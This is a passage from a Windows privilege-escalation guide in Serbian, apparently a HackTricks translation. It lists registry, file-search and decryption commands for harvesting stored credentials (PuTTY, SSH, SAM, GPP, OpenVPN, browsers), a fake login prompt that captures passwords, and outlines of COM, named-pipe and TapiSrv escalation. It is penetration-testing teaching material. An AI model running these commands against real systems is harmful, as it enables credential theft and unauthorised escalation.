Konfiguracije Velociraptor servera, koje se obično zovu `server.config.yaml`, mogu da sadrže `CA.private_key` interne CA. Ako korisnik sa nižim privilegijama može da pročita taj ključ, možda može da izda API klijentski sertifikat. Da li to vodi do viših privilegija zavisi od korisničkih uloga na serveru, dostupnosti API-ja i identiteta pod kojim se izvršava server ili ciljni agent. Klijentska konfiguracija sadrži drugačiji materijal; njeno pronalaženje ne dokazuje pristup CA servera. Neke instalacije čuvaju privatni ključ CA van mreže, pa čitljiva konfiguracija servera možda ne sadrži ključ za potpisivanje.

Na Windows serveru pregledajte ACL konfiguracije **servera** u njegovom direktorijуму za instalaciju i svih zaštićenih rezervnih kopija. Moguća lokacija je `%ProgramFiles%\VelociraptorServer\server.config.yaml`; ako se putanja konfigurisana za uslugu razlikuje, koristite nju. Potvrdite da trenutni identitet može da čita datoteku i da je `CA.private_key` zaista prisutan. Izbegavajte ispisivanje privatnog ključa u evidencijama ili izlazu enumeracije. Proizvođačev tok rada `config api_client` koristi ključ CA za izdavanje klijentskog sertifikata, ali potrebna je i efektivna serverska uloga; njeno kreiranje ili menjanje može zahtevati pristup za pisanje u skladište podataka ili ponovno pokretanje. Postojeći privilegovani serverski identitet može da obezbedi put čak i kada takvo pisanje nije dostupno. API upiti sa pravima za izvršavanje pokreću se u relevantnom kontekstu servera ili agenta, koji može imati visoke privilegije.

Zaštitite konfiguraciju servera i rezervne kopije restriktivnim ACL-ovima, držite ključ za potpisivanje CA van mreže kad god je moguće i ograničite API uloge i pristup listeneru. Pogledajte [Velociraptor API dokumentaciju](https://docs.velociraptor.app/docs/server_automation/server_api/) i [smernice za bezbednosnu konfiguraciju](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY akreditivi

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY je zaseban menadžer sesija. Njegova izvorna šifrovana baza može se nalaziti na `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, dok se izvezena rezervna kopija sesija može zvati `sessions-backup.dat` i biti sačuvana na drugoj lokaciji. [SolarWinds-ov vodič za izvoz](https://thwack.solarwinds.com/discussion/comment/115591) navodi da su izvozi šifrovani lozinkom i mogu sadržati sesije, ključeve, skripte, oznake i veze; njihov [forum za podršku](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) navodi lokaciju izvorne baze. Najpre proverite dozvole za datoteke i putanje. Pronalaženje bilo koje od ovih datoteka ne otkriva njenu lozinku niti dokazuje da su sačuvani akreditivi i dalje važeći ili da imaju veće privilegije.

### PuTTY SSH ključevi hostova

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti sačuvani u ključu registra `HKCU\Software\OpenSSH\Agent\Keys`, zato proverite da li se tamo nalazi nešto zanimljivo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos unutar te putanje, verovatno je reč o sačuvanom SSH ključu. Čuva se šifrovan, ali se lako može dešifrovati pomoću [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Više informacija o ovoj tehnici: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ako usluga `ssh-agent` nije pokrenuta i želite da se automatski pokreće pri podizanju sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Izgleda da ova tehnika više nije važeća. Pokušao sam da napravim ssh ključeve, dodam ih pomoću `ssh-add` i prijavim se na mašinu putem ssh-a. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji, a procmon nije zabeležio korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.

### Datoteke za automatsku instalaciju

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Ove datoteke možete potražiti i pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM i SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive rezervne datoteke Windows Imaging (`.wim`) mogu sadržati i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Dajte prednost lokalno dostupnim direktorijumima sa rezervnim kopijama ili slikama i proverite **nazive članova** slike pre nego što bilo šta izdvojite; samo ime `.wim` datoteke ne dokazuje da su hive-ovi izloženi, a uobičajene slike `install.wim`, `boot.wim` i slike za oporavak često navode na pogrešan trag. SMB deljenje je zaseban put pristupa i treba ga proveriti samo ako je to deljenje u obuhvatu. Pogledajte Microsoft-ova [uputstva za Windows slike](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za datoteke registry hive-ova](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Akreditivi u oblaku

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je bila dostupna funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupi računara putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao značajne bezbednosne propuste. Prvo, Group Policy Objects (GPO), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svakom korisniku domena. Drugo, lozinke u ovim GPP-ovima, šifrovane pomoću AES256 algoritma i javno dokumentovanog podrazumevanog ključa, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik jer je korisnicima moglo omogućiti da steknu povišene privilegije.

Da bi se ovaj rizik umanjio, razvijena je funkcija koja pretražuje lokalno keširane GPP datoteke i traži polje „cpassword“ koje nije prazno. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u identifikovanju i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Dešifrovanje cPassword-a:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje alata crackmapexec za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa podacima za prijavu:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup arhive u IIS webroot-u

Stara ZIP rezervna kopija postavljena direktno u webroot koji se poslužuje može otkriti prethodne konfiguracione datoteke i ponovo upotrebljive akreditive. Proverite konfigurisanu fizičku putanju sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` je samo moguća lokacija. Brza lokalna inventura može da izlista nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da pronađeni akreditiv omogućava viši nivo privilegija.

### OpenVPN akreditivi

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Evidencije

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite pristupne podatke

Uvek možete **da zatražite od korisnika da unese svoje pristupne podatke ili čak pristupne podatke drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje** od klijenta **pristupnih podataka** zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koji sadrže pristupne podatke**

Poznate datoteke koje su nekada sadržale **lozinke** u **običnom tekstu** ili formatu **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Varijanta liste naziva datoteka bez ekstenzije Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Datoteku čije se ime podudara tretirajte kao mogući šifrovani trezor; samo njeno postojanje ne znači da možete da je pročitate, otključate ili upotrebite bilo koje sačuvane akreditive. Prilikom provere mesta na kojima se takve datoteke čuvaju, pregledajte dostupne korisničke profile i konfigurisane korene deljenih datoteka.

Čitljiva KeePass `.kdbx` datoteka takođe je samo trag koji ukazuje na mogući šifrovani trezor. Za njeno otključavanje potrebni su stvarna glavna lozinka i svi konfigurisani faktori, poput datoteke ključa ili naloga. Ako ovlašćena provera pronađe par LM:NT hash vrednosti u nekom unosu, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen na NTLM servisu ciljnog sistema pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje Administrator ili SYSTEM prava; moraju biti ispunjeni i uslovi za udaljeni pristup servisu, prava naloga i svaki zaseban korak za izvršavanje servisa. U popisu treba navesti putanju do trezora i da li je čitljiv, a ne ispisivati bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Varijanta komande za pretragu bez dodatka Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u korpi za otpatke

Takođe proverite korpu za otpatke i potražite akreditive u njoj.

Proverite dostupne unose korpe za otpatke da biste pronašli obrisane rezervne kopije i arhive konfiguracije, kao i datoteke čiji nazivi izričito pominju akreditive. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara nekoliko meseci i imati uobičajen naziv. Windows čuva originalnu putanju i vreme brisanja u `$I` zapisu, a obrisanu datoteku kao odgovarajući `$R` unos; pregledajte metapodatke i proverite da li trenutni identitet ima dozvolu za čitanje pre otvaranja arhive. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za datoteke, tako da prazan spisak ne dokazuje da ne postoji nijedna rezervna kopija koju je moguće oporaviti. Naziv arhive tretirajte kao razlog za proveru, a ne kao dokaz da sadrži ispravnu tajnu.

Dostupna obrisana `.pfx` datoteka može biti i trag za **code-signing**. Ako sadrži dostupan privatni ključ, ključem se može potpisati izmenjena PowerShell skripta; [PowerShell zahteva sertifikat za code-signing sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u proveravaju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje između naloga zahteva da trenutni identitet može da izmeni tačno određenu skriptu, da efektivno pravilo prihvata njen potpis za tu skriptu i ciljni nalog i da zakazani zadatak ili drugi proces sa višim privilegijama zaista pokreće skriptu. Sam naziv `.pfx` datoteke, predmet sertifikata ili skripta sa dozvolom za pisanje ne dokazuju da je ovaj lanac uspostavljen. Pregledajte metapodatke, ACL-ove, smernice i zakazanu komandu pre otvaranja materijala sa privatnim ključem ili pokretanja zadatka.

Takođe proverite dostupne baze podataka profila klijenata za razmenu poruka, beleške i primljene datoteke da biste potražili tragove akreditiva. Izvoz BitLocker ključa za oporavak može biti sačuvan kao HTML ili TXT datoteka, ponekad i unutar imenovane rezervne arhive. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu koji sadrži starije rezervne kopije; proveravajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, oporavak domenских akreditiva van mreže zahteva i odgovarajuće `SYSTEM` hive, kao što je opisano u [proceduri za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Nazivi datoteka i zaključan volumen sami po sebi ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u nekoliko programa možete da koristite: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Drugi mogući ključevi registra sa akreditivima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje openssh ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Treba da proverite baze podataka u kojima se čuvaju lozinke iz pregledača **Chrome ili Firefox**.\
Treba da proverite baze podataka u kojima se čuvaju lozinke iz pregledača **Chrome, Edge ili Firefox**.\
Proverite i istoriju, obeleživače i omiljene stavke u pregledačima, jer se tamo možda čuvaju neke **lozinke**.

Za uobičajeni profil **Default** pregledača Edge trenutnog korisnika, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da je promene. Prisustvo datoteke samo ukazuje na moguću lokaciju sačuvanih kredencijala: proverite da li su datoteke čitljive, da li je dostupan DPAPI kontekst odgovarajućeg korisnika ili drugi ovlašćeni materijal za ključeve i da li sačavljena prijava pripada nalogu sa višim privilegijama. Samo nabrajanje putanja ne mora da otvara bazu podataka niti da ispisuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu povezane datoteke za ključeve i šifrovane prijave. Njihovo prisustvo samo ukazuje na moguću lokaciju: proverite да ли су обе датотеке читљиве, да ли постоје сачувани уноси и да ли лозинка Primary Password штити кључ пре него што закључите да су креденцијали употребљиви. Ако опорављени креденцијал припада доменском налогу, засебно проверите ефективна права тог налога за контролу групе и права групе за [читање или дешифровање LAPS лозинке](../active-directory-methodology/laps.md); артефакти прегледача сами по себи не доказују пут до администраторских привилегија.

Алатке за издвајање лозинки из прегледача:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** је технологија уграђена у оперативни систем Windows која омогућава **међусобну комуникацију** софтверских компоненти написаних на различитим језицима. Свака COM компонента је **идентификована помоћу class ID (CLSID)**, а свака компонента пружа функционалност преко једног или више интерфејса, идентификованих помоћу interface ID (IID).

COM класе и интерфејси дефинисани су у регистру под **HKEY\CLASSES\ROOT\CLSID** и **HKEY\CLASSES\ROOT\Interface**, редом. Овај регистар се креира спајањем **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Унутар CLSID-ова овог регистра можете пронаћи подређени кључ регистра **InProcServer32**, који садржи **подразумевану вредност** која упућује на **DLL** и вредност под називом **ThreadingModel**, чије вредности могу бити **Apartment** (једнонитни), **Free** (вишенитни), **Both** (једнонитни или вишенитни) или **Neutral** (независан од нити).

![Istorija pregledača - COM DLL Overwriting: Unutar CLSID-ova ovog registra možete pronaći podređeni ključ registra InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

У основи, ако можете да **препишете било коју од DLL датотека** које ће бити извршене, могли бисте да **повећате привилегије** ако ту DLL датотеку извршава други корисник.

Да бисте сазнали како нападачи користе COM Hijacking као механизам за постојаност, погледајте:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Општа претрага лозинки у датотекама и регистру**

**Претрага садржаја датотека**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Potražite datoteku sa određenim imenom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alatke koje traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** dodatak koji sam napravio da bi **automatski pokretao svaki Metasploit POST modul koji traži akreditive** na žrtvi.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski traži sve datoteke koje sadrže lozinke navedene na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedna odlična alatka za izdvajanje lozinki iz sistema.

Alatka [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alatki koje čuvaju ove podatke u običnom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, koji nasleđuje sve otvorene handle-ove glavnog procesa**.\
Zatim, ako imate **pun pristup procesu sa niskim privilegijama**, možete preuzeti **otvoreni handle do privilegovanog procesa koji je kreiran** pomoću `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o tome **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte [**ovu drugu objavu**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/) za detaljnije objašnjenje kako testirati i zloupotrebiti druge otvorene handle-ove procesa i niti nasleđene sa različitim nivoima dozvola (ne samo punim pristupom).](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, koji se nazivaju **pipe-ovi**, omogućavaju komunikaciju između procesa i prenos podataka.

Windows nudi funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo je slično arhitekturi klijent/server, sa ulogama koje se nazivaju **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može **preuzeti identitet** **klijenta**, pod uslovom da ima potrebna prava **SeImpersonate**. Pronalaženje **privilegovanog procesa** koji komunicira preko pipe-a koji možete imitirati pruža priliku da **dobijete veće privilegije** tako što ćete preuzeti identitet tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje takvog napada dostupna su [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Takođe, sledeći alat omogućava **presretanje komunikacije preko named pipe-a pomoću alata kao što je burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u režimu servera izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni, autentifikovani klijent može zloupotrebiti asinhronu putanju događaja zasnovanu na mailslot-u da pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobije administratorska prava za Telephony i učita proizvoljan DLL kao servis. Kompletan tok:

- `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju u koju može da se upisuje → servis je otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhrone upise događaja.
- Svaki događaj upisuje napadačevu kontrolisanu vrednost `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite podatke pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim je odregistrujte/isključite da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa proizvoljnom putanjom DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvršavaju sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba Protocol handler-a / ShellExecute preko Markdown renderera

Markdown linkovi na koje se može kliknuti, a koji se prosleđuju funkciji `ShellExecuteExW`, mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke pod kontrolom napadača kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}
